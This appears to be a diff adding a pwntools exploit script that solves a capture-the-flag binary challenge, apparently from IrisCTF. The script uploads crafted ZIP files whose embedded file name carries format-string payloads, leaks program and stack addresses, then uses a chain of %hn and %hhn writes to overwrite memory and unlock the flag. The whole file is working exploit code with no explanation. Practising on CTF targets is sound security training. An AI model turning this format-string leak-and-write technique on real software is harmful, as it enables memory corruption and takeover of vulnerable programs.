@@ -1,0 +1,122 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./chale")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.31.so")
+# context.log_level='debug'
+# p = remote("myfiles.chal.irisc.tf", 10001)
+# p = remote("0", 1337)
+p = process([exe.path])
+def GDB():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+    # decompiler connect ida
+    # b*0x000000000000240E+0x0000555555554000
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def head(fmtstr):
+    payload = f"504b03040a0000000000fc85235a0567a80413000000130000000e000000696e76697465636f64652e747874{fmtstr.encode().hex()}0001023f000a0000000000fc85235a0567a80413000000130000000e0024000000000000002000000000000000696e76697465636f64652e7478740a0020000000000001001800956d7887315edb01956d7887315edb0170eea180315edb01504b05060000000001000100600000003f0000000000"
+    return payload 
+sla(">", "3")
+sla("?", "yelling-pixel-corals")
+sla("?", "username")
+sla("?", "password")
+
+# sla(">", "6")
+# sla("?", "0")
+# sla("?", "password")
+file = open("test.zip", "rb")
+content = head("yellin%8$p  %80$plm")
+# log.info(f"{content.hex() = }")
+# log.info(f"{len(content) = }")
+sla(">", "4")
+sla("?", "0")
+sla("file", content)
+#0xfffffffffffffdce - 0x4 = 0xfffffffffffffdca
+sla(">", "5")
+sla("?", "0")
+sla("?", "password")
+sla("of?", "0")
+p.recvuntil("yellin")
+addr = int(p.recvuntil(" ",drop=True), 16)
+exe.address = addr - 0x5040
+log.info(f"addr {hex(addr) = }")
+log.info(f"{hex(exe.address) = }")
+target = 0x5050 + exe.address
+stack = int(p.recvuntil("lm",drop=True),16)
+target_stack = stack +184
+log.info(f"{hex(target) = }")
+log.info(f"{hex(stack) = }")
+# GDB()
+fmtstr = f"%{target_stack & 0xffff}c%82$hn"
+content2 = head(fmtstr)
+sla(">", "4")
+sla("?", "0")
+sla("file", content2)
+
+sla(">", "5")
+sla("?", "0")
+sla("?", "password")
+sla("of?", "1")
+
+fmtstr = f"%{target & 0xffff}c%117$hn"
+content2 = head(fmtstr)
+sla(">", "4")
+sla("?", "0")
+sla("file", content2)
+sla(">", "5")
+sla("?", "0")
+sla("?", "password")
+sla("of?", "2")
+# write the middle
+fmtstr = f"%{(target_stack+2) & 0xffff}c%82$hn"
+content2 = head(fmtstr)
+sla(">", "4")
+sla("?", "0")
+sla("file", content2)
+
+sla(">", "5")
+sla("?", "0")
+sla("?", "password")
+sla("of?", "3")
+
+fmtstr = f"%{(target >> 16) & 0xffff}c%117$hn"
+content2 = head(fmtstr)
+sla(">", "4")
+sla("?", "0")
+sla("file", content2)
+sla(">", "5")
+sla("?", "0")
+sla("?", "password")
+sla("of?", "4")
+
+
+fmtstr = f"%{0x1}c%109$hhn"
+content2 = head(fmtstr)
+sla(">", "4")
+sla("?", "0")
+sla("file", content2)
+
+sla(">", "5")
+sla("?", "0")
+sla("?", "password")
+sla("of?", "5")
+# get flag
+sla(">", "6")
+sla("?", "0")
+sla("?", "password")
+#
+
+
+p.interactive()
+# good luck pwning :)
